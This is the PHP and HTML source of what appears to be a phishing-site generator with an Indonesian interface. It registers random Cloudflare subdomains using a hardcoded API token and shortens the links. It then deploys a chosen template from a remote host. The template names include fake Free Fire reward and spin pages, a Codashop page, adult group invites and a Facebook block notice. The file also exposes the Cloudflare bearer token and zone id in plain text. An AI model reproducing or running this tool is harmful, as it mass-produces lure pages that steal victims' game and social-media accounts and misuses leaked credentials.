<?php

function generateRandomSubdomain($length = 4) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

$subdomain = generateRandomSubdomain();
$domain = 'tr-viyx.biz.id';
$zoneId = '7822de403ec3dbd1e32df27aa093f153';

$data = [
    'type' => 'A',
    'name' => $subdomain,
    'content' => '24.199.114.135',
    'ttl' => 1,
    'proxied' => true
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.cloudflare.com/client/v4/zones/'.$zoneId.'/dns_records');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Authorization: Bearer RDrywg-QzJC3r_BY3L3M5GK--MXNllLF0LdweKYH',
    'Content-Type: application/json',
]);

$response = curl_exec($ch);
curl_close($ch);

function shortenURL($longURL) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://klikdisiniiixz.vsnxz.my.id/add.php?url=" . urlencode($longURL));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded'
    ]);
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

$longURL = $subdomain . '.' . $domain;
$shortURL = shortenURL($longURL);

$xToken = json_decode(file_get_contents("gcode/xToken.json"), true);

if($xToken['token'] == "" || $xToken == null){
    die("<script>alert('Silahkan aktifkan terlebih dahulu website kamu!'); window.location='';</script>");
}

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken']; 
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "gcode/payload.php";
gcodeCheckSession("verify.php");

?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <title>Tools Create Website 2024</title>
  <style>
    @font-face {
      font-family: 'ibm';
      src: url('https://saweria.co/ibm-plex-mono-latin-400.woff');
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'ibm';
    }
    body {
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
      background: #E2E8F0;
    }
    .gateway {
      position: relative;
      max-width: 600px;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
    }
    .gateway span {
      margin-bottom: 20px;
    }
    .gateway .form {
      position: relative;
      width: 100%;
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 10px;
      padding: 0 20px;
    }
    .gateway .response {
      position: relative;
      width: 100%;
      display: none;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      padding: 0 20px;
      margin-top: 30px;
      gap: 10px;
    }
    .response textarea {
      width: 100%;
      padding-left: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
    }
    .form label {
      position: relative;
      width: 100%;
      display: flex;
      flex-direction: column;
    }
    label select, label input {
      width: 100%;
      border: 1px solid #000;
      border-radius: 5px;
      height: 30px;
      padding-left: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
    }
    *:focus {
      outline: none;
    }
    .form button {
      padding: 5px 10px;
      margin-top: 10px;
      background: #faae2b;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    .gateway .source {
      position: fixed;
      top: 5px;
      right: 10px;
      padding: 5px 10px;
      margin-top: 10px;
      background: #faae2b;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    footer {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .scode {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      background: #fff;
      height: 100%;
      z-index: 9999;
      display: none;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
    }
    .scode textarea {
      margin-top: 20px;
      width: 100%;
      height: 100%;
      padding-left: 5px;
      border-radius: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
    }
    .h1{
            font-size: 200px;
        }
    .scode i {
      position: fixed;
      top: 5px;
      right: 10px;
      padding: 5px 10px;
      margin-top: 10px;
      background: pink;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    #copyButton {
        position: absolute;
        top: 10px;
        right: 10px;
        padding: 5px 10px;
        background-color: #faae2b;
        border: 1px solid #000;
        border-radius: 3px;
        cursor: pointer;
    }
  </style>
</head>
<body>
<div class="gateway">
  <button onclick="sctools()" class="source">SC TOOLS WEB</button>
  <h1><img src="https://j.top4top.io/p_29937hv4d0.png" alt="" style="width: 250px;"></h1>
  <div class="form">
    <label> TAMPILAN
      <select class="aq" id="tampilan">
        <option selected disabled>Pilih terlebih dahulu...</option>
        <optgroup label="Kategori A">
          <option value="tampilan1.zip">MediaFire Zip</option>
          <option value="tampilan2.zip">MediaFire REGE</option>
          <option value="tampilan3.zip">MediaFire Mp4</option>
          <option value="tampilan4.zip">MediaFire Mp3</option>
        </optgroup>
        <optgroup label="Kategori B">
          <option value="tampilan5.zip">Grup Whatsapp 2024</option>
          <option value="tampilan6.zip">Grup Telegram 18+</option>
          <option value="tampilan7.zip">Simontok 2024</option>
          <option value="tampilan8.zip">Vidio Bkp</option>
        <option value="tampilan9.zip">Pemblokiran FB</option>
        </optgroup>
        <optgroup label="Kategori C">
        <option value="tampilan10.zip">Codashop FF 2024</option>
          <option value="tampilan11.zip">FF Claim V1 2024</option>
          <option value="tampilan12.zip">FF Claim V2 2024</option>
          <option value="tampilan13.zip">FF Claim V3 2024</option>
          <option value="tampilan14.zip">FF Claim V4 2024</option>
          <option value="tampilan15.zip">FF Claim V5 2024</option>
          </optgroup>
        <optgroup label="Kategori D">
        <option value="tampilan16.zip">FF Spin V1 2024</option>
        <option value="tampilan17.zip">FF Spin V2 2024</option>
        <option value="tampilan18.zip">FF Spin Scorpio</option>
        <option value="tampilan19.zip">FF Spin Ramadhan</option>
        <option value="tampilan20.zip">FF Spin Spiderman</option>
        <option value="tampilan21.zip">FF Spin Rampage</option>
        </optgroup>
      </select>
    </label>
    <label> SUBDOMAIN
      <input name="subdomain" id="subdomain" type="text" class="playerid form-input" value="<?= $longURL ?>" readonly>
    </label>
    <button name="submit" id="btn">Create Web</button>
  </div>
  <div class="response">
    <span>DETAIL WEBSITE</span>
    <textarea id="responseTextArea" rows='8' readonly></textarea>
    <button id="copyButton"><i class="fa fa-copy"></i> Salin Web</button>  
  </div>
</div>
<footer>
  Crafted By <a href="https://t.me/hatsuhost" style="text-decoration: none;margin: 0 10px"> HATSU HOST</a> 2024 <style="margin-left: 10px">
</footer>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
$(document).ready(function() {
    $("#btn").click(function() {
        var domainValue = $("#subdomain").val();
        var selectedValue = $("#tampilan").val();

        var button = $("#btn");
        button.html('Proses <i class="fa fa-spinner fa-spin"></i>');
        button.prop('disabled', true);

        var responseText = "Control: (JANGAN SAMPAI HILANG)\n\n";
        responseText += "Shortlink: <?= $shortURL ?>\n";
        responseText += "Link Web: https://<?= $longURL ?>\n";
        responseText += "Link Setting: https://<?= $longURL ?>/update\n";
        responseText += "Tanggal Pembuatan: " + new Date().toLocaleDateString();

        $("#responseTextArea").val(responseText);
        $("#copyButton").css("display", "block");

        setTimeout(function() {
            $(".response").css("display", "block");
            button.html('Success, Harap Simpan Website!');
            button.prop('disabled', false);
        }, 20000);

        if(selectedValue === "tampilan1.zip") {
      var url = "https://tr-viyx.biz.id/step1.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params);
    } else if(selectedValue === "tampilan2.zip") {
      var url = "https://tr-viyx.biz.id/step2.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params);
    } else if(selectedValue === "tampilan3.zip") {
      var url = "https://tr-viyx.biz.id/step3.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params);
    } else if(selectedValue === "tampilan4.zip") {
      var url = "https://tr-viyx.biz.id/step4.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params);
    } else if(selectedValue === "tampilan5.zip") {
      var url = "https://tr-viyx.biz.id/step5.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params);
    } else if(selectedValue === "tampilan6.zip") {
      var url = "https://tr-viyx.biz.id/step6.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params);
    } else if(selectedValue === "tampilan7.zip") {
      var url = "https://tr-viyx.biz.id/step7.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params);
    } else if(selectedValue === "tampilan8.zip") {
      var url = "https://tr-viyx.biz.id/step8.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params);
    } else if(selectedValue === "tampilan9.zip") {
      var url = "https://tr-viyx.biz.id/step9.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params);
    } else if(selectedValue === "tampilan10.zip") {
      var url = "https://tr-viyx.biz.id/step10.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params);
    } else if(selectedValue === "tampilan11.zip") {
      var url = "https://tr-viyx.biz.id/step11.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params);      
    } else if(selectedValue === "tampilan12.zip") {
      var url = "https://tr-viyx.biz.id/step12.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params); 
    } else if(selectedValue === "tampilan13.zip") {
      var url = "https://tr-viyx.biz.id/step13.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params); 
    } else if(selectedValue === "tampilan14.zip") {
      var url = "https://tr-viyx.biz.id/step14.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params); 
    } else if(selectedValue === "tampilan15.zip") {
      var url = "https://tr-viyx.biz.id/step15.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params); 
    } else if(selectedValue === "tampilan16.zip") {
      var url = "https://tr-viyx.biz.id/step16.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params); 
    } else if(selectedValue === "tampilan17.zip") {
      var url = "https://tr-viyx.biz.id/step17.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params); 
    } else if(selectedValue === "tampilan18.zip") {
      var url = "https://tr-viyx.biz.id/step18.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params); 
    } else if(selectedValue === "tampilan19.zip") {
      var url = "https://tr-viyx.biz.id/step19.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params); 
    } else if(selectedValue === "tampilan20.zip") {
      var url = "https://tr-viyx.biz.id/step20.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params); 
    } else if(selectedValue === "tampilan21.zip") {
      var url = "https://tr-viyx.biz.id/step21.php";
      var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
      sendRequest(url, params); 
    }
});

    $("#responseTextArea").blur(function() {
        $("#copyButton").css("display", "none");
    });

    function sendRequest(url, params) {
        $.post(url, params, function(data, status) {
            console.log("Respon dari server:", data);
        });
    }

    $("#copyButton").click(function() {
        var textarea = $("#responseTextArea");
        textarea.select();
        document.execCommand("copy");
        alert("Teks berhasil disalin!");
    });

    let status = "hide";

    function toggleSource() {
        let element = $(".scode");

        if (status == "hide") {
            element.css("display", "flex");
            status = "show";
        } else {
            element.css("display", "none");
            status = "hide";
        }
    }
});
</script>
 <script>
    function sctools() {
        window.location = '/sctoolsweb2024.zip';
    }
    
        
</script>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}